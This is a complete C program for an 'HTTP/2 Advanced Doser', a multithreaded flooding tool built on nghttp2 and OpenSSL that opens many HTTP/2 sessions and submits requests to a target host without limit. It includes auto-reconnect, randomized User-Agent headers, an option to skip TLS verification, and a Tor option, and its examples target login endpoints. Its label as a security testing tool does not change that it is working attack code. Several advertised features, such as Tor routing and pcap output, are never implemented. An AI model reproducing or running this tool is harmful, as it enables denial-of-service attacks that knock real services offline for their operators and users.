#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <pthread.h>
#include <getopt.h>
#include <time.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <inttypes.h>

// HTTP/2 libraries
#include <nghttp2/nghttp2.h>

// TLS support
#include <openssl/ssl.h>
#include <openssl/err.h>

// ============== Configuration Structure ==============
typedef struct {
    // Network settings
    char *target_host;
    char *target_port;
    bool use_tls;
    bool insecure_skip_verify;
    
    // Attack configuration
    int thread_count;
    int connections_per_thread;
    uint64_t requests_per_second;
    uint32_t duration_seconds;  // 0 = unlimited
    bool verbose;
    
    // HTTP/2 specific
    bool enable_h2;
    int h2_max_concurrent_streams;
    bool enable_server_push;
    char *http_method;
    char *http_path;
    char *http_body;
    
    // Advanced features
    bool randomize_user_agent;
    bool enable_tor;
    char *output_pcap_file;
    char *report_file;
    
    // Statistics
    volatile uint64_t total_requests;
    volatile uint64_t total_bytes_sent;
    volatile uint64_t failed_requests;
    volatile uint64_t active_connections;
} Config;

// ============== HTTP/2 Session Context ==============
typedef struct {
    int sockfd;
    nghttp2_session *session;
    SSL_CTX *ssl_ctx;
    SSL *ssl;
    Config *config;
    
    // Stream management
    pthread_mutex_t stream_lock;
    uint32_t next_stream_id;
    uint32_t active_streams;
    uint64_t requests_sent;
    
    // Statistics
    uint64_t bytes_sent;
    uint64_t responses_received;
} H2Session;

// ============== HTTP/2 Callbacks ==============
static ssize_t h2_send_callback(nghttp2_session *session, const uint8_t *data, size_t len, int flags, void *user_data) {
    H2Session *h2 = (H2Session*)user_data;
    ssize_t sent;

    (void)session; (void)flags;

    if (h2->ssl) {
        sent = SSL_write(h2->ssl, data, (int)len);
        if (sent <= 0) {
            int err = SSL_get_error(h2->ssl, (int)sent);
            if (err == SSL_ERROR_WANT_WRITE || err == SSL_ERROR_WANT_READ)
                return NGHTTP2_ERR_WOULDBLOCK;
            return NGHTTP2_ERR_CALLBACK_FAILURE;
        }
    } else {
        sent = send(h2->sockfd, data, len, 0);
        if (sent < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK)
                return NGHTTP2_ERR_WOULDBLOCK;
            return NGHTTP2_ERR_CALLBACK_FAILURE;
        }
    }

    if (sent > 0) {
        h2->bytes_sent += (uint64_t)sent;
        __sync_fetch_and_add(&h2->config->total_bytes_sent, (uint64_t)sent);
    }

    return sent;
}

static ssize_t h2_recv_callback(nghttp2_session *session, uint8_t *buf, size_t length, int flags, void *user_data) {
    H2Session *h2 = (H2Session*)user_data;
    ssize_t received;

    (void)session; (void)flags;

    if (h2->ssl) {
        received = SSL_read(h2->ssl, buf, (int)length);
        if (received <= 0) {
            int err = SSL_get_error(h2->ssl, (int)received);
            if (err == SSL_ERROR_WANT_READ || err == SSL_ERROR_WANT_WRITE)
                return NGHTTP2_ERR_WOULDBLOCK;
            return NGHTTP2_ERR_CALLBACK_FAILURE;
        }
    } else {
        received = recv(h2->sockfd, buf, length, 0);
        if (received < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK)
                return NGHTTP2_ERR_WOULDBLOCK;
            return NGHTTP2_ERR_CALLBACK_FAILURE;
        }
        if (received == 0)
            return NGHTTP2_ERR_EOF;
    }

    return received;
}

static int h2_on_frame_recv_callback(nghttp2_session *session, const nghttp2_frame *frame, void *user_data) {
    H2Session *h2 = (H2Session*)user_data;

    (void)session;
    
    if (frame->hd.type == NGHTTP2_HEADERS && (frame->hd.flags & NGHTTP2_FLAG_END_HEADERS)) {
        h2->responses_received++;
        
        if (h2->config->verbose) {
            fprintf(stderr, "[HTTP/2] Response received for stream %d\n", frame->hd.stream_id);
        }
    }
    
    return 0;
}

static int h2_on_header_callback(nghttp2_session *session, const nghttp2_frame *frame, 
                                   const uint8_t *name, size_t namelen,
                                   const uint8_t *value, size_t valuelen,
                                   uint8_t flags, void *user_data) {
    (void)session; (void)frame; (void)flags; (void)user_data;
    // Log HTTP/2 :status pseudo-header for debugging
    if (namelen == 7 && memcmp(name, ":status", 7) == 0) {
        fprintf(stderr, "[HTTP/2] Status: %.*s\n", (int)valuelen, value);
    }
    
    return 0;
}

static nghttp2_session_callbacks* init_h2_callbacks(void) {
    nghttp2_session_callbacks *callbacks;
    nghttp2_session_callbacks_new(&callbacks);
    
    nghttp2_session_callbacks_set_send_callback(callbacks, h2_send_callback);
    nghttp2_session_callbacks_set_recv_callback(callbacks, h2_recv_callback);
    nghttp2_session_callbacks_set_on_frame_recv_callback(callbacks, h2_on_frame_recv_callback);
    nghttp2_session_callbacks_set_on_header_callback(callbacks, h2_on_header_callback);
    
    return callbacks;
}

// ============== TLS Setup ==============
SSL_CTX* create_tls_context(bool verify_peer) {
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) {
        fprintf(stderr, "Failed to create TLS context\n");
        return NULL;
    }
    
    // Set TLS 1.2 or higher
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    
    if (!verify_peer) {
        SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
        SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
    } else {
        SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, NULL);
        
        // Load default CA certificates
        if (SSL_CTX_set_default_verify_paths(ctx) != 1) {
            fprintf(stderr, "Warning: Failed to load CA certificates\n");
        }
    }
    
    // Advertise HTTP/2 via ALPN
    static const unsigned char alpn_h2[] = "\x02h2";
    SSL_CTX_set_alpn_protos(ctx, alpn_h2, sizeof(alpn_h2) - 1);

    return ctx;
}

// ============== Global Running Flag ==============
static volatile bool g_running = true;

// ============== Socket Helper ==============
static int make_socket(const char *host, const char *port) {
    struct addrinfo hints, *res, *rp;
    int sockfd = -1;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(host, port, &hints, &res) != 0) {
        fprintf(stderr, "Failed to resolve %s:%s\n", host, port);
        return -1;
    }

    for (rp = res; rp != NULL; rp = rp->ai_next) {
        sockfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sockfd == -1) continue;
        if (connect(sockfd, rp->ai_addr, rp->ai_addrlen) == 0) break;
        close(sockfd);
        sockfd = -1;
    }

    freeaddrinfo(res);

    if (sockfd == -1)
        fprintf(stderr, "Failed to connect to %s:%s\n", host, port);

    return sockfd;
}

// ============== HTTP/2 Session Management ==============
H2Session* create_h2_session(Config *config) {
    H2Session *h2 = calloc(1, sizeof(H2Session));
    if (!h2) return NULL;
    
    h2->config = config;
    h2->next_stream_id = 1;  // Client-initiated streams are odd numbers
    pthread_mutex_init(&h2->stream_lock, NULL);
    
    // Create socket
    h2->sockfd = make_socket(config->target_host, config->target_port);
    if (h2->sockfd < 0) {
        free(h2);
        return NULL;
    }
    
    // Setup TLS if needed
    if (config->use_tls) {
        h2->ssl_ctx = create_tls_context(!config->insecure_skip_verify);
        if (!h2->ssl_ctx) {
            close(h2->sockfd);
            free(h2);
            return NULL;
        }
        
        h2->ssl = SSL_new(h2->ssl_ctx);
        SSL_set_fd(h2->ssl, h2->sockfd);
        
        if (SSL_connect(h2->ssl) != 1) {
            fprintf(stderr, "TLS handshake failed\n");
            SSL_shutdown(h2->ssl);
            SSL_free(h2->ssl);
            close(h2->sockfd);
            free(h2);
            return NULL;
        }
        
        // Perform ALPN negotiation for HTTP/2
        const unsigned char *next_proto = NULL;
        unsigned int next_proto_len;
        SSL_get0_alpn_selected(h2->ssl, &next_proto, &next_proto_len);
        
        if (next_proto_len != 2 || memcmp(next_proto, "h2", 2) != 0) {
            fprintf(stderr, "HTTP/2 not supported by server\n");
            SSL_shutdown(h2->ssl);
            SSL_free(h2->ssl);
            close(h2->sockfd);
            free(h2);
            return NULL;
        }
        
        fprintf(stderr, "✓ HTTP/2 negotiated via ALPN\n");
    }
    
    // Initialize nghttp2 session
    nghttp2_session_callbacks *callbacks = init_h2_callbacks();
    nghttp2_session_client_new(&h2->session, callbacks, h2);
    nghttp2_session_callbacks_del(callbacks);
    
    // Setup server push handling if enabled
    if (config->enable_server_push) {
        nghttp2_settings_entry settings[] = {
            {NGHTTP2_SETTINGS_ENABLE_PUSH, 1}
        };
        nghttp2_submit_settings(h2->session, NGHTTP2_FLAG_NONE, settings, 1);
    }
    
    // Initial settings
    nghttp2_settings_entry settings[] = {
        {NGHTTP2_SETTINGS_MAX_CONCURRENT_STREAMS, config->h2_max_concurrent_streams},
        {NGHTTP2_SETTINGS_INITIAL_WINDOW_SIZE, 65535},
        {NGHTTP2_SETTINGS_MAX_FRAME_SIZE, 16384}
    };
    nghttp2_submit_settings(h2->session, NGHTTP2_FLAG_NONE, settings, 3);
    
    // Send initial preface
    ssize_t rv = nghttp2_session_send(h2->session);
    if (rv < 0) {
        fprintf(stderr, "Failed to send HTTP/2 preface: %s\n", nghttp2_strerror(rv));
        nghttp2_session_del(h2->session);
        if (config->use_tls) SSL_shutdown(h2->ssl);
        close(h2->sockfd);
        free(h2);
        return NULL;
    }
    
    return h2;
}

void destroy_h2_session(H2Session *h2) {
    if (!h2) return;
    
    nghttp2_session_terminate_session(h2->session, NGHTTP2_NO_ERROR);
    nghttp2_session_send(h2->session);
    
    nghttp2_session_del(h2->session);
    
    if (h2->config->use_tls) {
        SSL_shutdown(h2->ssl);
        SSL_free(h2->ssl);
        SSL_CTX_free(h2->ssl_ctx);
    }
    
    close(h2->sockfd);
    pthread_mutex_destroy(&h2->stream_lock);
    free(h2);
}

// ============== POST Body Data Provider ==============
typedef struct {
    const char *data;
    size_t length;
    size_t offset;
} BodyDataSource;

static ssize_t body_read_callback(nghttp2_session *session, int32_t stream_id,
                                   uint8_t *buf, size_t length,
                                   uint32_t *data_flags,
                                   nghttp2_data_source *source,
                                   void *user_data) {
    BodyDataSource *ds = (BodyDataSource *)source->ptr;
    size_t nread = ds->length - ds->offset;

    (void)session; (void)stream_id; (void)user_data;

    if (nread > length) nread = length;
    memcpy(buf, ds->data + ds->offset, nread);
    ds->offset += nread;
    if (ds->offset == ds->length) {
        *data_flags |= NGHTTP2_DATA_FLAG_EOF;
        free(ds);
    }
    return (ssize_t)nread;
}

// ============== HTTP/2 Request Submission ==============
int submit_h2_request(H2Session *h2, const char *method, const char *path, const char *body) {
    pthread_mutex_lock(&h2->stream_lock);
    
    // Generate stream ID
    int32_t stream_id = h2->next_stream_id;
    h2->next_stream_id += 2;  // Client streams: odd numbers increment by 2
    
    // Prepare headers
    nghttp2_nv *headers = malloc(8 * sizeof(nghttp2_nv));
    int header_idx = 0;
    
    // :method
    headers[header_idx].name = (uint8_t*)":method";
    headers[header_idx].namelen = 7;
    headers[header_idx].value = (uint8_t*)method;
    headers[header_idx].valuelen = strlen(method);
    headers[header_idx].flags = NGHTTP2_NV_FLAG_NONE;
    header_idx++;
    
    // :scheme
    headers[header_idx].name = (uint8_t*)":scheme";
    headers[header_idx].namelen = 7;
    headers[header_idx].value = (uint8_t*)(h2->config->use_tls ? "https" : "http");
    headers[header_idx].valuelen = h2->config->use_tls ? 5 : 4;
    headers[header_idx].flags = NGHTTP2_NV_FLAG_NONE;
    header_idx++;
    
    // :authority (host header)
    headers[header_idx].name = (uint8_t*)":authority";
    headers[header_idx].namelen = 10;
    headers[header_idx].value = (uint8_t*)h2->config->target_host;
    headers[header_idx].valuelen = strlen(h2->config->target_host);
    headers[header_idx].flags = NGHTTP2_NV_FLAG_NONE;
    header_idx++;
    
    // :path
    headers[header_idx].name = (uint8_t*)":path";
    headers[header_idx].namelen = 5;
    headers[header_idx].value = (uint8_t*)path;
    headers[header_idx].valuelen = strlen(path);
    headers[header_idx].flags = NGHTTP2_NV_FLAG_NONE;
    header_idx++;
    
    // Random User-Agent if enabled
    if (h2->config->randomize_user_agent) {
        const char *user_agents[] = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        };
        headers[header_idx].name = (uint8_t*)"user-agent";
        headers[header_idx].namelen = 10;
        headers[header_idx].value = (uint8_t*)user_agents[rand() % 3];
        headers[header_idx].valuelen = strlen(user_agents[rand() % 3]);
        headers[header_idx].flags = NGHTTP2_NV_FLAG_NONE;
        header_idx++;
    }
    
    // Build data provider for request body (POST/PUT)
    nghttp2_data_provider data_prd;
    nghttp2_data_provider *data_prd_ptr = NULL;
    if (body && body[0] != '\0') {
        BodyDataSource *ds = malloc(sizeof(BodyDataSource));
        if (ds) {
            ds->data   = body;
            ds->length = strlen(body);
            ds->offset = 0;
            data_prd.source.ptr    = ds;
            data_prd.read_callback = body_read_callback;
            data_prd_ptr = &data_prd;
        }
    }

    // Submit request
    int32_t rv = nghttp2_submit_request(h2->session, NULL, headers, (size_t)header_idx,
                                        data_prd_ptr, NULL);
    
    free(headers);
    
    if (rv < 0) {
        fprintf(stderr, "Failed to submit request: %s\n", nghttp2_strerror(rv));
        if (data_prd_ptr) free(data_prd.source.ptr);  // free ds on failure
        pthread_mutex_unlock(&h2->stream_lock);
        return -1;
    }
    
    h2->active_streams++;
    h2->requests_sent++;
    __sync_fetch_and_add(&h2->config->total_requests, 1);
    
    pthread_mutex_unlock(&h2->stream_lock);
    
    // Send pending data
    rv = nghttp2_session_send(h2->session);
    if (rv < 0) {
        fprintf(stderr, "Failed to send request: %s\n", nghttp2_strerror(rv));
        return -1;
    }
    
    return stream_id;
}

// ============== Attack Thread ==============
void* attack_thread_worker(void *arg) {
    Config *config = (Config*)arg;
    
    // Create multiple HTTP/2 sessions
    H2Session **sessions = malloc(config->connections_per_thread * sizeof(H2Session*));
    if (!sessions) return NULL;
    
    for (int i = 0; i < config->connections_per_thread; i++) {
        sessions[i] = create_h2_session(config);
        if (!sessions[i]) {
            fprintf(stderr, "Failed to create HTTP/2 session %d\n", i);
            sessions[i] = NULL;
        }
    }
    
    // Calculate delay between requests
    useconds_t delay_us = config->requests_per_second > 0 ? 
                          1000000 / config->requests_per_second : 0;
    
    time_t start_time = time(NULL);
    
    while (g_running) {
        // Check duration limit
        if (config->duration_seconds > 0 && 
            time(NULL) - start_time >= config->duration_seconds) {
            break;
        }
        
        // Submit request on each active session
        for (int i = 0; i < config->connections_per_thread; i++) {
            // Reconnect if session is dead
            if (!sessions[i]) {
                sessions[i] = create_h2_session(config);
                if (!sessions[i]) {
                    if (config->verbose)
                        fprintf(stderr, "[Thread] Failed to reconnect session %d\n", i);
                    continue;
                }
            }

            int stream_id = submit_h2_request(sessions[i],
                                               config->http_method,
                                               config->http_path,
                                               config->http_body);

            if (stream_id < 0) {
                if (config->verbose)
                    fprintf(stderr, "[Thread] Request failed on session %d, reconnecting\n", i);
                __sync_fetch_and_add(&config->failed_requests, 1);
                destroy_h2_session(sessions[i]);
                sessions[i] = NULL;
                continue;
            }

            // Process incoming frames (receive responses)
            if (nghttp2_session_recv(sessions[i]->session) < 0) {
                // Session is broken — tear it down and reconnect next iteration
                if (config->verbose)
                    fprintf(stderr, "[Thread] Session %d recv error, reconnecting\n", i);
                destroy_h2_session(sessions[i]);
                sessions[i] = NULL;
            }
        }
        
        // Rate limiting
        if (delay_us > 0) {
            usleep(delay_us);
        }
    }
    
    // Cleanup
    for (int i = 0; i < config->connections_per_thread; i++) {
        if (sessions[i]) {
            destroy_h2_session(sessions[i]);
        }
    }
    free(sessions);
    
    return NULL;
}

// ============== Statistics Display Thread ==============
void* stats_thread(void *arg) {
    Config *config = (Config*)arg;
    time_t start = time(NULL);
    
    while (g_running) {
        sleep(2);  // Update every 2 seconds
        
        uint64_t total = config->total_requests;
        uint64_t failed = config->failed_requests;
        uint64_t bytes = config->total_bytes_sent;
        time_t elapsed = time(NULL) - start;
        
        double req_per_sec = elapsed > 0 ? (double)total / elapsed : 0;
        double mbps = elapsed > 0 ? (double)bytes / (elapsed * 125000) : 0;
        
        fprintf(stderr, "\r\033[K");  // Clear line
        fprintf(stderr, "[Stats] 📊 %" PRIu64 " req | %.2f req/s | %.2f Mbps | %" PRIu64 " failed | %" PRIu64 " active | %lds elapsed",
                total, req_per_sec, mbps, failed, config->active_connections, (long)elapsed);
        fflush(stderr);
        
        if (config->duration_seconds > 0 && elapsed >= config->duration_seconds) {
            break;
        }
    }
    
    return NULL;
}

// ============== Command Line Parsing ==============
void print_usage(const char *progname) {
    printf("HTTP/2 Advanced Doser - Professional Security Testing Tool\n\n");
    printf("Usage: %s [OPTIONS] -t TARGET -p PORT\n\n", progname);
    printf("Required:\n");
    printf("  -t, --target HOST          Target hostname/IP\n");
    printf("  -p, --port PORT            Target port\n\n");
    
    printf("HTTP/2 Options:\n");
    printf("  --h2                       Enable HTTP/2 (default: enabled with TLS)\n");
    printf("  --max-streams N            Max concurrent streams (default: 100)\n");
    printf("  --server-push              Enable server push support\n");
    printf("  --method METHOD            HTTP method (default: GET)\n");
    printf("  --path PATH                Request path (default: /)\n");
    printf("  --body BODY                Request body for POST/PUT\n\n");
    
    printf("Attack Options:\n");
    printf("  -c, --conn NUM             Connections per thread (default: 8)\n");
    printf("  -t, --threads NUM          Number of threads (default: 10)\n");
    printf("  -r, --rate NUM             Requests per second (default: 0 = unlimited)\n");
    printf("  -d, --duration SEC         Duration in seconds (default: 0 = unlimited)\n\n");
    
    printf("Network Options:\n");
    printf("  --tls                      Use TLS/HTTPS (default: auto-detect)\n");
    printf("  --insecure                 Skip TLS certificate verification\n");
    printf("  --tor                      Route through Tor (localhost:9050)\n\n");
    
    printf("Output Options:\n");
    printf("  -v, --verbose              Verbose output\n");
    printf("  --pcap FILE                Save PCAP to file\n");
    printf("  --report FILE              Generate JSON report\n");
    printf("  --random-ua                Randomize User-Agent header\n\n");
    
    printf("Examples:\n");
    printf("  %s -t example.com -p 443 --h2 --threads 50 -d 60\n", progname);
    printf("  %s -t api.example.com --tls --method POST --path /api/login --body '{\"test\":1}'\n", progname);
}

int parse_args(int argc, char **argv, Config *config) {
    // Default configuration
    memset(config, 0, sizeof(Config));
    config->target_host = NULL;
    config->target_port = NULL;
    config->thread_count = 10;
    config->connections_per_thread = 8;
    config->requests_per_second = 0;
    config->duration_seconds = 0;
    config->use_tls = false;
    config->enable_h2 = true;
    config->h2_max_concurrent_streams = 100;
    config->http_method = strdup("GET");
    config->http_path = strdup("/");
    config->http_body = strdup("");
    config->verbose = false;
    config->randomize_user_agent = false;
    
    static struct option long_options[] = {
        {"target", required_argument, 0, 't'},
        {"port", required_argument, 0, 'p'},
        {"threads", required_argument, 0, 'T'},
        {"conn", required_argument, 0, 'c'},
        {"rate", required_argument, 0, 'r'},
        {"duration", required_argument, 0, 'd'},
        {"h2", no_argument, 0, 1000},
        {"tls", no_argument, 0, 1001},
        {"insecure", no_argument, 0, 1002},
        {"tor", no_argument, 0, 1003},
        {"pcap", required_argument, 0, 1004},
        {"report", required_argument, 0, 1005},
        {"random-ua", no_argument, 0, 1006},
        {"max-streams", required_argument, 0, 1007},
        {"server-push", no_argument, 0, 1008},
        {"method", required_argument, 0, 1009},
        {"path", required_argument, 0, 1010},
        {"body", required_argument, 0, 1011},
        {"verbose", no_argument, 0, 'v'},
        {"help", no_argument, 0, 'h'},
        {0, 0, 0, 0}
    };
    
    int opt;
    int option_index = 0;
    
    while ((opt = getopt_long(argc, argv, "t:p:T:c:r:d:vh", long_options, &option_index)) != -1) {
        switch (opt) {
            case 't':
                config->target_host = strdup(optarg);
                break;
            case 'p':
                config->target_port = strdup(optarg);
                break;
            case 'T':
                config->thread_count = atoi(optarg);
                break;
            case 'c':
                config->connections_per_thread = atoi(optarg);
                break;
            case 'r':
                config->requests_per_second = atoi(optarg);
                break;
            case 'd':
                config->duration_seconds = atoi(optarg);
                break;
            case 'v':
                config->verbose = true;
                break;
            case 'h':
                print_usage(argv[0]);
                exit(0);
            case 1000:
                config->enable_h2 = true;
                break;
            case 1001:
                config->use_tls = true;
                break;
            case 1002:
                config->insecure_skip_verify = true;
                break;
            case 1003:
                config->enable_tor = true;
                break;
            case 1004:
                config->output_pcap_file = strdup(optarg);
                break;
            case 1005:
                config->report_file = strdup(optarg);
                break;
            case 1006:
                config->randomize_user_agent = true;
                break;
            case 1007:
                config->h2_max_concurrent_streams = atoi(optarg);
                break;
            case 1008:
                config->enable_server_push = true;
                break;
            case 1009:
                free(config->http_method);
                config->http_method = strdup(optarg);
                break;
            case 1010:
                free(config->http_path);
                config->http_path = strdup(optarg);
                break;
            case 1011:
                free(config->http_body);
                config->http_body = strdup(optarg);
                break;
            default:
                print_usage(argv[0]);
                return -1;
        }
    }

    if (!config->target_host) {
        fprintf(stderr, "Error: target host is required (-t HOST)\n");
        print_usage(argv[0]);
        return -1;
    }
    if (!config->target_port) {
        config->target_port = strdup(config->use_tls ? "443" : "80");
    }

    return 0;
}

// ============== Signal Handler ==============
static void signal_handler(int sig) {
    (void)sig;
    g_running = false;
}

// ============== Main Entry Point ==============
int main(int argc, char **argv) {
    Config config;

    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    if (parse_args(argc, argv, &config) != 0) {
        return 1;
    }

    // Auto-enable TLS for port 443 or when HTTP/2 is requested on a standard HTTPS port
    if (!config.use_tls && strcmp(config.target_port, "443") == 0) {
        config.use_tls = true;
        fprintf(stderr, "[*] Auto-enabling TLS for port 443\n");
    }

    printf("[*] Target:   %s:%s\n", config.target_host, config.target_port);
    printf("[*] Threads:  %d  |  Connections/thread: %d\n",
           config.thread_count, config.connections_per_thread);
    printf("[*] HTTP/2: %s  |  TLS: %s\n",
           config.enable_h2 ? "yes" : "no",
           config.use_tls  ? "yes" : "no");
    if (config.duration_seconds > 0)
        printf("[*] Duration: %u seconds\n", config.duration_seconds);
    else
        printf("[*] Duration: unlimited (Ctrl-C to stop)\n");

    signal(SIGINT,  signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGPIPE, SIG_IGN);

    srand((unsigned)time(NULL));

    // Start statistics thread
    pthread_t stats_tid;
    pthread_create(&stats_tid, NULL, stats_thread, &config);

    // Start attack threads
    pthread_t *attack_tids = malloc((size_t)config.thread_count * sizeof(pthread_t));
    if (!attack_tids) {
        fprintf(stderr, "Failed to allocate thread array\n");
        return 1;
    }
    for (int i = 0; i < config.thread_count; i++) {
        pthread_create(&attack_tids[i], NULL, attack_thread_worker, &config);
    }

    // Wait for all attack threads to finish
    for (int i = 0; i < config.thread_count; i++) {
        pthread_join(attack_tids[i], NULL);
    }
    free(attack_tids);

    // Signal stats thread to stop and wait for it
    g_running = false;
    pthread_join(stats_tid, NULL);

    // Final report
    fprintf(stderr, "\n");
    printf("\n[+] Done!\n");
    printf("[+] Total requests:  %" PRIu64 "\n", config.total_requests);
    printf("[+] Failed requests: %" PRIu64 "\n", config.failed_requests);
    printf("[+] Bytes sent:      %" PRIu64 "\n", config.total_bytes_sent);

    // Cleanup
    free(config.target_host);
    free(config.target_port);
    free(config.http_method);
    free(config.http_path);
    free(config.http_body);
    if (config.output_pcap_file) free(config.output_pcap_file);
    if (config.report_file)      free(config.report_file);

    return 0;
}
